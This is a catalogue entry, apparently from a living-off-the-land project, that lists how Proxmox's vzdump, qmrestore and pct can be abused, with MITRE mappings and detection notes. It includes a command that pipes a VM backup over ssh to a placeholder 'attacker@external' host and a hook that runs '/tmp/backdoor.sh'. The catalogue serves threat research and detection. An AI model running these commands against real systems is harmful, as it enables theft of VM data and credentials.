---
Name: vzdump
Description: vzdump is the Proxmox VE backup utility for creating VM and container backups. It supports multiple backup modes and compression algorithms. Adversaries can abuse vzdump to create full VM snapshots for offline credential extraction, encrypt backups for ransomware operations, or exfiltrate entire VM images.
Author: 'ZephrFish'
Created: 2025-12-06
Commands:
  - Command: vzdump {vmid}
    Description: Create a backup of a VM or container.
    Usecase: Create full VM backups for offline analysis, credential extraction, or exfiltration.
    Category: collection
    Privileges: Administrator
    MitreID: T1005
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - vzdump 100
      - vzdump 100 --mode snapshot --compress zstd
      - vzdump 100 --storage local --mode stop

  - Command: vzdump {vmid} --mode snapshot --dumpdir /path
    Description: Create a live snapshot backup to a specific directory.
    Usecase: Backup VMs to attacker-controlled storage for exfiltration.
    Category: exfiltration
    Privileges: Administrator
    MitreID: T1567
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - vzdump 100 --mode snapshot --dumpdir /mnt/exfil
      - vzdump 100 --stdout | ssh attacker@external "cat > backup.vma"

  - Command: vzdump --all
    Description: Backup all VMs and containers on the node.
    Usecase: Mass backup of all VMs for comprehensive data theft or ransomware staging.
    Category: collection
    Privileges: Administrator
    MitreID: T1005
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - vzdump --all --mode snapshot
      - vzdump --all --compress none --dumpdir /mnt/fast-backup

  - Command: vzdump {vmid} --script /path/to/script
    Description: Execute a custom script during backup phases (pre, post).
    Usecase: Execute arbitrary code during backup operations for persistence or lateral movement.
    Category: execution
    Privileges: Administrator
    MitreID: T1059
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - vzdump 100 --script /tmp/backdoor.sh

  - Command: qmrestore {backup.vma} {vmid}
    Description: Restore a VM from a vzdump backup.
    Usecase: Restore VMs from backups containing older vulnerable configurations or known credentials.
    Category: persistence
    Privileges: Administrator
    MitreID: T1078
    OperatingSystem: Proxmox VE

  - Command: pct restore {ctid} {backup.tar} --storage local
    Description: Restore a container from a vzdump backup.
    Usecase: Restore containers from backups to access older credentials or configurations.
    Category: persistence
    Privileges: Administrator
    MitreID: T1078
    OperatingSystem: Proxmox VE

Full_Path:
  - Path: /usr/bin/vzdump
  - Path: /usr/sbin/qmrestore
  - Path: /usr/sbin/pct

Detection:
  - Note: Monitor /var/log/pve/tasks/* for backup operations
  - Note: Watch for backups to non-standard locations
  - Note: Alert on --all backup operations during unusual hours

Resources:
  - Link: https://pve.proxmox.com/pve-docs/vzdump.1.html
  - Link: https://pve.proxmox.com/wiki/Backup_and_Restore

Acknowledgement:
  - Person: ZephrFish
    Handle: '@ZephrFish'
---
